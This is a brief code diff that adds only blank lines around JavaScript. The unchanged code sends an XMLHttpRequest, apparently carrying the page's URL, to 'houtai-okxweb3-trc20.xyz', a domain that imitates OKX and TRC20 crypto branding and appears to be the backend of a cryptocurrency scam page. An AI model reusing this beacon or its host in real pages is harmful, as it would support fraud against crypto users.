@@ -1,3 +1,4 @@
+
         var api_url = 'https://houtai-okxweb3-trc20.xyz';
         var domain = window.location.href;
         var xhr = new XMLHttpRequest();
@@ -12,3 +13,6 @@
             }
         };
         xhr.send();
+
+
+
